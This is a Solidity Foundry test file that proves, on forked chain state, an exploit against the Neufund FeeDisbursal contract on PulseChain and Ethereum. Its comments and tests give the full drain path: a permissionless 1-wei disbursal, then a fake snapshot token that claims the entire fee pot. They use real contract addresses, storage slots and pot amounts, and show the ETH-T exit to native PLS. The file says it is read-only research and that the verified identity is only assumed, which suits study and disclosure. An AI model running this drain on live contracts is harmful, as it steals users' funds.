// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {FakeSnapshotToken} from "../src/FakeSnapshotToken.sol";

interface IFeeDisbursal {
    function accept(address token, address proRataToken, uint256 until) external;
    function getDisbursalCount(address token, address proRataToken) external view returns (uint256);
    function claimable(address token, address proRataToken, address claimer, uint256 until)
        external
        view
        returns (uint256 claimableAmount, uint256 totalAmount, uint256 recycleableAfter, uint256 firstIndex);
}

interface IFeeDisbursalController {
    function onAccept(address token, address proRataToken, address claimer) external view returns (bool);
    function onRecycle(address token, address proRataToken, address[] calldata investors, uint256 until)
        external
        view
        returns (bool);
}

interface IERC223Token {
    function transfer(address to, uint256 amount, bytes calldata data) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function withdraw(uint256 amount) external;
}

interface IIdentityRegistry {
    function getClaims(address identity) external view returns (bytes32);
}

/// @title Neufund FeeDisbursal — live-state fork PoC (PulseChain 369 + Ethereum 1)
/// @notice READ-ONLY RESEARCH. Fork tests only. No mainnet transaction is ever sent.
///
/// The exploit path under test (proven on Ethereum mainnet in tx 0x144b67…, block 26,057,969):
///   1. `tokenFallback`/`receiveApproval` (public) -> `disburse(token, wallet, amount, proRataToken, …)`
///      -> `FeeDisbursalController.onDisburse` checks only that `token` is a *registered*
///      disbursable token and that the disburser has ROLE_DISBURSER. `RoleBasedAccessPolicy`
///      grants ROLE_DISBURSER to EVERYONE (address(0)) on FeeDisbursal, so anyone qualifies.
///   2. A 1-wei disbursal is recorded against an attacker-controlled `proRataToken`.
///   3. `accept(token, proRataToken, uint256.max)` -> `onAccept` checks only `canClaim(msg.sender)`;
///      `claimPrivate` then reads balanceOfAt/totalSupplyAt from the *caller-supplied* token.
///      A fake token returning `totalSupplyAt = 1` and `balanceOfAt = pot` makes the pro-rata
///      claim equal to the whole pot.
///
/// The only gate is `canClaim` — a Neufund KYC identity (`isVerified && !accountFrozen`).
/// The test that models a verified attacker writes the IdentityRegistry `_claims[attacker]`
/// slot directly (slot 1) and is therefore an ASSUMPTION, not a proven unprivileged path.
contract NeufundFeeDisbursalTest is Test {
    // ---- mainnet addresses (identical on Ethereum and PulseChain) ----
    address constant FD = 0x26B7DedAb33c58bC9Edc26D9CD81b8eEE43c24Dd;
    address constant CONTROLLER = 0xa10e0AB575016F91Df28C20306f359123BE5ac7D;
    address constant IDENTITY_REGISTRY = 0x98B2d718D96F956d1CdEDA013CFd67a797928B13;
    address constant ETHT = 0x0B7dc5A43Ce121b4EaaA41b0F4f43BBA47Bb8951; // Ether Token  (1:1 native)
    address constant EURT = 0x61646f3BEdE9E1A24D387Feb661888B4cc1587d8; // Euro Token   (bank-claim)
    address constant NEU = 0xA823E6722006afe99E91c30FF5295052fe6b8E32; // Neumark (pro-rata of record)

    uint256 constant POT_ETHT = 54.182755636303147479 ether;
    uint256 constant POT_EURT = 29_090.974053149037619268 ether;

    // Storage slots discovered on-chain (keccak(key . slot) probes)
    uint256 constant ETHT_BAL_SLOT = 0;
    uint256 constant EURT_BAL_SLOT = 4;
    uint256 constant IR_CLAIMS_SLOT = 1;

    address attacker = address(0xA11CE);
    address fresh = address(0xB0B);

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------
    function _forkPulse() internal {
        string memory rpc = vm.envOr("PULSECHAIN_RPC_URL", string("https://pulsechain-rpc.publicnode.com"));
        vm.createSelectFork(rpc);
    }

    function _forkEth() internal {
        string memory rpc = vm.envOr("FORK_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        vm.createSelectFork(rpc);
    }

    /// @dev ASSUMPTION: gives `who` a verified Neufund identity by writing the
    ///      IdentityRegistry._claims mapping. A real attacker cannot do this
    ///      (setClaims is only(ROLE_IDENTITY_MANAGER)).
    function _assumeVerified(address who) internal {
        vm.store(IDENTITY_REGISTRY, keccak256(abi.encode(who, IR_CLAIMS_SLOT)), bytes32(uint256(1)));
        assertEq(IIdentityRegistry(IDENTITY_REGISTRY).getClaims(who), bytes32(uint256(1)), "claims not set");
    }

    function _setBalance(address token, address who, uint256 slot, uint256 amount) internal {
        vm.store(token, keccak256(abi.encode(who, slot)), bytes32(amount));
        assertEq(IERC223Token(token).balanceOf(who), amount, "balance not set");
    }

    /// @dev Creates a 1-wei disbursal against `fake` by making a real 1-wei ERC223
    ///      transfer into FeeDisbursal (this is exactly what the 2026-09-26 attacker did).
    function _createDisbursal(address token, address fake) internal {
        vm.prank(attacker);
        IERC223Token(token).transfer(FD, 1, abi.encodePacked(fake));
    }

    // ------------------------------------------------------------------
    // PulseChain 369
    // ------------------------------------------------------------------

    /// @notice A fresh, unverified EOA cannot claim: the 1-wei disbursal is created
    ///         permissionlessly but `accept` reverts with NF_ACCEPT_REJECTED.
    function test_PLS_freshEOA_isRejected() public {
        _forkPulse();
        console2.log("PULSE block", block.number);

        FakeSnapshotToken fake = new FakeSnapshotToken(POT_ETHT);
        _setBalance(ETHT, fresh, ETHT_BAL_SLOT, 1);

        vm.prank(fresh);
        IERC223Token(ETHT).transfer(FD, 1, abi.encodePacked(address(fake)));

        vm.roll(block.number + 1);

        assertEq(IFeeDisbursalController(CONTROLLER).onAccept(ETHT, address(fake), fresh), false, "gate should be closed");

        vm.prank(fresh);
        vm.expectRevert(bytes("NF_ACCEPT_REJECTED"));
        IFeeDisbursal(FD).accept(ETHT, address(fake), type(uint256).max);
    }

    /// @notice With an (ASSUMED) verified identity the fake-token path drains the whole
    ///         ETH-T pot. Exit is EtherToken.withdraw() -> native PLS at 1:1. Quantified.
    function test_PLS_verifiedIdentity_drainsETHT_and_exitsToNativePLS() public {
        _forkPulse();
        console2.log("PULSE block", block.number);

        _assumeVerified(attacker);
        _setBalance(ETHT, attacker, ETHT_BAL_SLOT, 1);

        FakeSnapshotToken fake = new FakeSnapshotToken(POT_ETHT);
        _createDisbursal(ETHT, address(fake));

        vm.roll(block.number + 1);

        uint256 nativeBefore = attacker.balance;
        vm.startPrank(attacker);
        IFeeDisbursal(FD).accept(ETHT, address(fake), type(uint256).max);
        uint256 claimed = IERC223Token(ETHT).balanceOf(attacker);
        assertEq(claimed, POT_ETHT, "did not drain the ETH-T pot");

        IERC223Token(ETHT).withdraw(claimed);
        vm.stopPrank();

        uint256 nativeGained = attacker.balance - nativeBefore;
        console2.log("ETH-T drained (wei)", claimed);
        console2.log("native PLS received (wei)", nativeGained);
        assertEq(nativeGained, POT_ETHT, "withdraw did not pay 1:1 native");

        console2.log("=> ETH-T on PulseChain is 1:1 redeemable for PLS, not ETH");
    }

    /// @notice Same drain against EUR-T: the claim succeeds, but the token is not
    ///         redeemable (EuroTokenController.onDestroyTokens returns false without
    ///         a bank-account claim) and cannot even be transferred to a fresh EOA.
    function test_PLS_EURT_claimSucceeds_butIsUnredeemableAndUntransferable() public {
        _forkPulse();
        console2.log("PULSE block", block.number);

        _assumeVerified(attacker);
        _setBalance(EURT, attacker, EURT_BAL_SLOT, 1);

        FakeSnapshotToken fake = new FakeSnapshotToken(POT_EURT);
        _createDisbursal(EURT, address(fake));

        vm.roll(block.number + 1);

        vm.startPrank(attacker);
        IFeeDisbursal(FD).accept(EURT, address(fake), type(uint256).max);
        uint256 claimed = IERC223Token(EURT).balanceOf(attacker);
        assertEq(claimed, POT_EURT, "did not drain the EUR-T pot");

        // 1) no fiat redemption: withdraw() -> onDestroyTokens() == false
        vm.expectRevert();
        IERC223Token(EURT).withdraw(claimed);

        // 2) cannot sell to a fresh (non-KYC) buyer: transfer is gated by the token controller
        vm.expectRevert();
        IERC223Token(EURT).transfer(fresh, claimed, "");
        vm.stopPrank();

        console2.log("EUR-T claimed (wei)", claimed);
        console2.log("=> EUR-T is a dead bank-claim: no redemption since 2021, no DEX pair");
    }

    // ------------------------------------------------------------------
    // Ethereum 1
    // ------------------------------------------------------------------

    function test_ETH_freshEOA_isRejected() public {
        _forkEth();
        console2.log("ETH block", block.number);
        // ETH-T pot on Ethereum is empty (drained 2026-09-26); use EUR-T to test the gate.
        FakeSnapshotToken fake = new FakeSnapshotToken(POT_EURT);

        // A fresh EOA cannot even move EUR-T (token controller requires KYC on both sides),
        // so the disbursal cannot be created by it at all. `accept` still reaches the
        // controller gate first, which is what we assert here.
        vm.prank(fresh);
        vm.expectRevert(bytes("NF_ACCEPT_REJECTED"));
        IFeeDisbursal(FD).accept(EURT, address(fake), type(uint256).max);

        assertFalse(IFeeDisbursalController(CONTROLLER).onAccept(EURT, address(fake), fresh));
    }

    function test_ETH_verifiedIdentity_claimsEurtRemainder_butCannotRedeem() public {
        _forkEth();
        console2.log("ETH block", block.number);

        _assumeVerified(attacker);
        _setBalance(EURT, attacker, EURT_BAL_SLOT, 1);

        FakeSnapshotToken fake = new FakeSnapshotToken(POT_EURT);
        _createDisbursal(EURT, address(fake));

        vm.roll(block.number + 1);

        vm.startPrank(attacker);
        IFeeDisbursal(FD).accept(EURT, address(fake), type(uint256).max);
        uint256 claimed = IERC223Token(EURT).balanceOf(attacker);
        assertEq(claimed, POT_EURT, "did not drain the EUR-T remainder");

        vm.expectRevert();
        IERC223Token(EURT).withdraw(claimed);
        vm.stopPrank();

        console2.log("EUR-T remainder claimed (wei)", claimed);
        console2.log("ETH-T pot at this block:", IERC223Token(ETHT).balanceOf(FD));
    }

    // ------------------------------------------------------------------
    // permissionless surfaces (no identity needed)
    // ------------------------------------------------------------------

    /// @notice Documents the two identity-free surfaces: onDisburse (EVERYONE has
    ///         ROLE_DISBURSER) and onRecycle (returns true unconditionally).
    function test_PLS_disburseAndRecycle_arePermissionless() public {
        _forkPulse();
        _assumeVerified(attacker);
        address[] memory empty = new address[](0);
        assertTrue(IFeeDisbursalController(CONTROLLER).onRecycle(ETHT, NEU, empty, type(uint256).max));
        // onAccept only looks at the claimer, never at token/proRataToken:
        assertTrue(IFeeDisbursalController(CONTROLLER).onAccept(ETHT, address(0xdead), attacker));
        console2.log("onAccept(token=ETHT, proRata=0xdead, attacker) = true (if verified)");
    }
}
